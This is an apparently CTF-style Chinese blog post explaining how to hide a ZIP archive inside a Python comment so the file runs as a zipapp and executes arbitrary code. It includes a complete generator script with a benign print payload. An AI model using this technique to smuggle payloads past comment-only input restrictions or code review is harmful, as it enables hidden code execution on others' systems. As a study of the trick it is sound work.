---
date: 2025-08-04T10:30:00+08:00
draft: false
title: "Executing arbitrary Python code from a comment"
---
通过注释执行任意Python代码

### 问题描述
Q: 只能控制一行的.py代码中注释的内容(\n\r均会被替换为空字符), 如何执行任意代码?  
A: 在注释#中, 构造一个.zip 文件, python 会将该内容当成一个zip包执行, 触发任意代码执行  

### 解决方案
- 从 Python 3.5 起, 可以直接执行一个 .zip 文件
    ```python3
    python myapp.zip
    ```
    前提是ZIP 包中包含一个顶层的`__main__.py`文件, Python 会把它当作 zipapp, 自动解压并运行`__main__.py`

    > Python 会从末尾找到 ZIP 的目录结构, 而不是依赖文件头, 所以前面的“垃圾”字节会被忽略

Python 源码中的任何行, 只要以 # 开头, 解释器都会忽略后面内容, 因此可以:
- 把 ZIP 文件的数据藏在 Python 源码中的注释中（开头加 #）
- 把 ZIP 数据直接拼接在 Python 文件的后面, 只保证文件头部分是合法 Python
- ZIP 不关心前缀, Python 只要最前面是有效源码, 也不会管后面

### 难点
ZIP 文件头包含**二进制字段**，比如
- 偏移量（文件数据相对于 ZIP 开头的位置）
- 长度（文件名长度、注释长度等）
- 这些值写死在 header 里, 是十六进制整数
- 如果这些字节中出现了像 \x00、\xFF 等非 ASCII 内容, Python 就不能把它当注释

解决方法: 暴力穷举合法组合

想办法 **调整偏移值和结构位置**，使得最终写出来的 ZIP 文件
- 所有的字段值都转化为 可打印字符（ASCII 范围内）
- 所有 binary 字段看起来都像合法的注释字符串
于是用 `itertools.product(range(256), repeat=2)` 暴力尝试偏移组合，只要碰巧生成的 ZIP 包所有关键字节都在可打印范围内（ASCII 32~126），就认为成功。



下面是`generate_polygloy_zip.py`代码, 会生成一个符合要求的`polygloy.py`代码, 最后运行该代码, 可以执行Body里面的内容`BODY = b"print('FROM MAIN.py FILE!!!')#"`

```python3
# struct: 按字节结构打包数据，方便构造 ZIP 文件二进制头
# itertools: 用来暴力枚举 CRC 校验和后缀（确保安全ASCII）
# zlib: 计算 CRC32 校验和
import struct, itertools, zlib

# 文件开头代码
# encode(): Unicode 字符串 -> bytes 字节串
JUNK_HEAD = """print("Hello World!")
# This is a comment. Here's another:
# """.encode()

# 文件结尾代码
JUNK_TAIL = """
print("Thanks for playing!")"""


# zip 文件核心代码
# b: 字节串
FILENAME = b"__main__.py"
BODY = b"print('FROM MAIN.py FILE!!!')#"


# 校验 CRC 是否为 ASCII-safe
def ascii_safe(x: int) -> bool:
    return all(((x >> (8*i)) & 0x80) == 0 for i in range(4))


# 检查 32 位整数的四个字节，每个字节最高位（0x80）是否为 0，即是否为 ASCII 范围内的字节
def find_suffix(core: bytes, length: int = 4) -> tuple[bytes, int]:
    """
    - ZIP 文件 CRC32 计算结果必须 ASCII-safe（低于 0x80）
    - 这里用暴力方法，给 payload 后面加4字节后缀，找到合适的后缀让 CRC32 满足 ASCII-safe 条件
    """
    printable = range(0x20, 0x7f)
    for tail in itertools.product(printable, repeat=length):
        payload = core + bytes(tail)
        crc = zlib.crc32(payload) & 0xFFFFFFFF
        if ascii_safe(crc):
            return bytes(tail), crc

    raise RuntimeError("No ASCII-safe CRC found.")

# 计算最终 payload
SUFFIX, CRC = find_suffix(BODY)
PAYLOAD = BODY + SUFFIX
SIZE = len(PAYLOAD)

def le32(x): return struct.pack("<I", x) # 4字节小端无符号整数
def le16(x): return struct.pack("<H", x) # 2字节小端无符号整数

# ZIP 结构中各签名常量
SIG_LFH  = 0x04034B50 # 本地文件头 Local File Header
SIG_CDH  = 0x02014B50 # 中央目录头 Central Directory Header
SIG_EOCD = 0x06054B50 # 结束目录头 End of Central Directory

# zip 文件偏移量设置
delta = len(JUNK_HEAD)

# 构建 Local File Header
"""
Local File Header 是 ZIP 格式中的一部分，告诉解压程序该文件的元信息
- version needed to extract，flags，compression method 等字段置 0 表示无压缩，简单存储
- CRC32、压缩大小、解压大小都是我们计算的
- 文件名长度和文件名
"""
lfh = (
    le32(SIG_LFH) +
    le16(0) + le16(0) + le16(0) + le16(0) + le16(0) +
    le32(CRC) + le32(SIZE) + le32(SIZE) +
    le16(len(FILENAME)) + le16(0) +
    FILENAME
)

# 构建 Central Directory Header
"""
- Central Directory 是 ZIP 文件目录结构，记录每个文件信息和偏移，
- 其中重要的是 relative offset of LFH，也就是 Local File Header 在整个 ZIP 文件里的偏移，必须加上 delta
"""
cdh = (
    le32(SIG_CDH) +
    le16(0) + le16(0) + le16(0) + le16(0) + le16(0) + le16(0) +
    le32(CRC) + le32(SIZE) + le32(SIZE) +
    le16(len(FILENAME)) + le16(0) + le16(0) +
    le16(0) + le16(0) + le32(0) + le32(delta) +
    FILENAME
)

# 确保偏移量 ASCII-safe
"""
- ZIP 目录偏移需要是 ASCII 字节，否则写入 .py 文件时会出错
- 这里通过填充若干 \x00 字节，保证偏移合法
"""
cd_offset = delta + len(lfh) + len(PAYLOAD)
pad = 0
while not ascii_safe(cd_offset + pad):
    pad += 1
padding = b'\x00' * pad
cd_offset += pad

# 构建 End of Central Directory Header
"""
EOCD 记录 ZIP 中央目录大小、偏移及注释长度等信息
"""
eocd = (
    le32(SIG_EOCD) +
    le16(0) + le16(0) +
    le16(1) + le16(1) +
    le32(len(cdh)) +
    le32(cd_offset) +
    le16(len(JUNK_TAIL))
)

# 拼接完整 ZIP 内容
zip_bytes = lfh + PAYLOAD + padding + cdh + eocd
zip_bytes = bytearray(zip_bytes)
assert all(b < 0x80 for b in zip_bytes), "非 ASCII 字节存在"

# 写入 polyglot.py 文件
with open("polyglot.py", "wb") as f:
    f.write(JUNK_HEAD + zip_bytes + JUNK_TAIL.encode())

# 运行提示
print("✅ polyglot.py 生成完毕。运行它即可执行嵌入的 __main__.py 内容：")
print("  $ python3 polyglot.py")
```
